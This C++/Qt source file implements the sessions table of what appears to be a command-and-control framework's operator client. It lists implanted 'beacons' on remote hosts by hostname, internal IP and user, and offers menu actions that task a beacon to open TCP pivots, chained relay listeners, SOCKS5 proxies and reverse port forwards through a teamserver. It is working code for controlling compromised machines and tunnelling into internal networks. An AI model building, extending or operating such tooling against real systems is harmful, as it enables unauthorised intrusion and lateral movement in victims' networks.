#include "SessionsView.hpp"
#include "SvgIcon.hpp"
#include "../models/SessionsModel.hpp"
#include "../net/ServerClient.hpp"

#include <co2h/kv.hpp>
#include <co2h/proto.hpp>

#include <QApplication>
#include <QClipboard>
#include <QDialog>
#include <QDialogButtonBox>
#include <QFormLayout>
#include <QHeaderView>
#include <QLabel>
#include <QLineEdit>
#include <QMenu>
#include <QSpinBox>
#include <QTableView>
#include <QVBoxLayout>

namespace co2h::client::ui {

SessionsView::SessionsView(SessionsModel* model, ServerClient* client, QWidget* parent)
    : QWidget(parent), model_(model), client_(client) {
    auto* v = new QVBoxLayout(this);
    v->setContentsMargins(0, 0, 0, 0);
    v->setSpacing(0);

    view_ = new QTableView(this);
    view_->setModel(model_);
    view_->setSelectionBehavior(QAbstractItemView::SelectRows);
    view_->setSelectionMode(QAbstractItemView::SingleSelection);
    view_->setAlternatingRowColors(true);
    view_->verticalHeader()->setVisible(false);
    view_->horizontalHeader()->setStretchLastSection(true);
    view_->setIconSize(QSize(18, 18));
    view_->setContextMenuPolicy(Qt::CustomContextMenu);

    v->addWidget(view_);

    connect(view_, &QTableView::doubleClicked, this, [this](const QModelIndex& idx) {
        if (!idx.isValid()) return;
        const auto* r = model_->row(idx.row());
        if (r) emit interactRequested(r->id);
    });

    connect(view_, &QTableView::customContextMenuRequested, this,
            [this](const QPoint& pos) {
        auto idx = view_->indexAt(pos);
        if (!idx.isValid()) return;
        const auto* r = model_->row(idx.row());
        if (!r) return;

        const QSize ico{16, 16};
        QMenu menu(this);
        menu.addAction(glassyIcon(":/icons/terminal.svg",    QColor("#10b981"), ico),
                       "Interact",         [this, id = r->id]{ emit interactRequested(id); });
        menu.addSeparator();
        menu.addAction(glassyIcon(":/icons/copy.svg",        QColor("#94a3b8"), ico),
                       "Copy beacon ID",   [id = r->id]{ QApplication::clipboard()->setText(id); });
        menu.addAction(glassyIcon(":/icons/copy.svg",        QColor("#94a3b8"), ico),
                       "Copy hostname",    [h = r->host]{ QApplication::clipboard()->setText(h); });
        menu.addAction(glassyIcon(":/icons/copy.svg",        QColor("#94a3b8"), ico),
                       "Copy IP address",  [ip = r->internal_ip]{ QApplication::clipboard()->setText(ip); });
        menu.addAction(glassyIcon(":/icons/user.svg",        QColor("#94a3b8"), ico),
                       "Copy username",    [u = r->user]{ QApplication::clipboard()->setText(u); });
        menu.addSeparator();
        menu.addAction(glassyIcon(":/icons/connection.svg",  QColor("#06b6d4"), ico),
                       "Start TCP pivot (fast SOCKS)…", [this, id = r->id]{
            auto* dlg = new QDialog(this);
            dlg->setWindowTitle("Start TCP pivot listener");

            auto* bindHost  = new QLineEdit("0.0.0.0", dlg);
            auto* socksPort = new QSpinBox(dlg);
            socksPort->setRange(1, 65535); socksPort->setValue(1080);
            auto* pivotPort = new QSpinBox(dlg);
            pivotPort->setRange(1, 65535); pivotPort->setValue(4446);

            auto* form = new QFormLayout;
            form->addRow("Bind host:", bindHost);
            form->addRow("SOCKS port:", socksPort);
            form->addRow("Pivot port (beacon connects here):", pivotPort);

            auto* btns = new QDialogButtonBox(
                QDialogButtonBox::Ok | QDialogButtonBox::Cancel, dlg);
            connect(btns, &QDialogButtonBox::accepted, dlg, &QDialog::accept);
            connect(btns, &QDialogButtonBox::rejected, dlg, &QDialog::reject);

            auto* v = new QVBoxLayout(dlg);
            v->addLayout(form); v->addWidget(btns);

            if (dlg->exec() == QDialog::Accepted) {
                // 1. Open pivot listener on teamserver.
                QString lname = QString("pivot-%1").arg(id.left(8));
                client_->addPivotListener(lname, bindHost->text(),
                    static_cast<quint16>(socksPort->value()),
                    static_cast<quint16>(pivotPort->value()));
                // 2. Send OP_TCP_PIVOT to beacon so it connects back.
                co2h::kv::Writer w;
                w.put_str("host", bindHost->text() == "0.0.0.0"
                    ? "127.0.0.1" : bindHost->text().toStdString());
                w.put_u32("port", static_cast<std::uint32_t>(pivotPort->value()));
                auto pl = w.finish();
                client_->taskBeacon(id, co2h::proto::TaskOp::TcpPivot,
                    QByteArray(reinterpret_cast<const char*>(pl.data()),
                               static_cast<int>(pl.size())));
            }
            dlg->deleteLater();
        });
        menu.addAction(glassyIcon(":/icons/connection.svg",  QColor("#8b5cf6"), ico),
                       "Start relay port (chain pivot)…", [this, id = r->id]{
            auto* dlg = new QDialog(this);
            dlg->setWindowTitle("Start relay listener");

            auto* portSpin = new QSpinBox(dlg);
            portSpin->setRange(1, 65535); portSpin->setValue(4447);

            auto* form = new QFormLayout;
            form->addRow("Relay port (child beacons connect here):", portSpin);

            auto* btns = new QDialogButtonBox(
                QDialogButtonBox::Ok | QDialogButtonBox::Cancel, dlg);
            connect(btns, &QDialogButtonBox::accepted, dlg, &QDialog::accept);
            connect(btns, &QDialogButtonBox::rejected, dlg, &QDialog::reject);

            auto* v = new QVBoxLayout(dlg);
            v->addLayout(form); v->addWidget(btns);

            if (dlg->exec() == QDialog::Accepted) {
                // Отправить OP_RELAY_START родительскому бикону.
                co2h::kv::Writer w;
                w.put_u32("port", static_cast<std::uint32_t>(portSpin->value()));
                auto pl = w.finish();
                client_->taskBeacon(id, co2h::proto::TaskOp::RelayStart,
                    QByteArray(reinterpret_cast<const char*>(pl.data()),
                               static_cast<int>(pl.size())));
            }
            dlg->deleteLater();
        });
        menu.addAction(glassyIcon(":/icons/connection.svg",  QColor("#8b5cf6"), ico),
                       "Generate relay child beacon…", [this, id = r->id,
                                                        ip  = r->internal_ip,
                                                        lst = r->listener]{
            emit relayChildRequested(id, ip, lst);
        });
        menu.addSeparator();
        menu.addAction(glassyIcon(":/icons/socks.svg",       QColor("#06b6d4"), ico),
                       "Start SOCKS5 listener (polling)…", [this, id = r->id]{
            auto* dlg = new QDialog(this);
            dlg->setWindowTitle("Start SOCKS5 listener");

            auto* bindHost = new QLineEdit("127.0.0.1", dlg);
            auto* bindPort = new QSpinBox(dlg);
            bindPort->setRange(1, 65535);
            bindPort->setValue(1080);

            auto* form = new QFormLayout;
            form->addRow("Bind host:", bindHost);
            form->addRow("Bind port:", bindPort);

            auto* btns = new QDialogButtonBox(
                QDialogButtonBox::Ok | QDialogButtonBox::Cancel, dlg);
            connect(btns, &QDialogButtonBox::accepted, dlg, &QDialog::accept);
            connect(btns, &QDialogButtonBox::rejected, dlg, &QDialog::reject);

            auto* v = new QVBoxLayout(dlg);
            v->addLayout(form);
            v->addWidget(btns);

            if (dlg->exec() == QDialog::Accepted) {
                QString lname = QString("socks-%1").arg(id.left(8));
                client_->addSocks5Listener(lname, id,
                                           bindHost->text(),
                                           static_cast<quint16>(bindPort->value()));
            }
            dlg->deleteLater();
        });
        menu.addAction(glassyIcon(":/icons/connection.svg",  QColor("#f59e0b"), ico),
                       "Start Reverse Port Forward…", [this, id = r->id]{
            // Открывает диалог настройки rportfwd:
            // сервер будет слушать на bind_port, трафик идёт через бикон к rhost:rport.
            auto* dlg = new QDialog(this);
            dlg->setWindowTitle("Start Reverse Port Forward");

            auto* bindHost = new QLineEdit("0.0.0.0", dlg);
            auto* bindPort = new QSpinBox(dlg);
            bindPort->setRange(1, 65535);
            bindPort->setValue(8080);
            auto* rHost = new QLineEdit("127.0.0.1", dlg);
            auto* rPort = new QSpinBox(dlg);
            rPort->setRange(1, 65535);
            rPort->setValue(80);

            auto* hint = new QLabel(
                "<i>Teamserver will open a TCP port (bind). "
                "Incoming connections are proxied through the beacon to rhost:rport.</i>",
                dlg);
            hint->setWordWrap(true);
            hint->setStyleSheet("color:#94a3b8;padding-top:4px;");

            auto* form = new QFormLayout;
            form->addRow("Bind host (server):", bindHost);
            form->addRow("Bind port (server):", bindPort);
            form->addRow("Rhost (beacon target):", rHost);
            form->addRow("Rport (beacon target):", rPort);

            auto* btns = new QDialogButtonBox(
                QDialogButtonBox::Ok | QDialogButtonBox::Cancel, dlg);
            connect(btns, &QDialogButtonBox::accepted, dlg, &QDialog::accept);
            connect(btns, &QDialogButtonBox::rejected, dlg, &QDialog::reject);

            auto* v = new QVBoxLayout(dlg);
            v->addLayout(form);
            v->addWidget(hint);
            v->addWidget(btns);

            if (dlg->exec() == QDialog::Accepted) {
                QString lname = QString("rpf-%1").arg(id.left(8));
                client_->addRportfwdListener(lname, id,
                                             bindHost->text(),
                                             static_cast<quint16>(bindPort->value()),
                                             rHost->text(),
                                             static_cast<quint16>(rPort->value()));
            }
            dlg->deleteLater();
        });
        menu.exec(view_->viewport()->mapToGlobal(pos));
    });
}

}
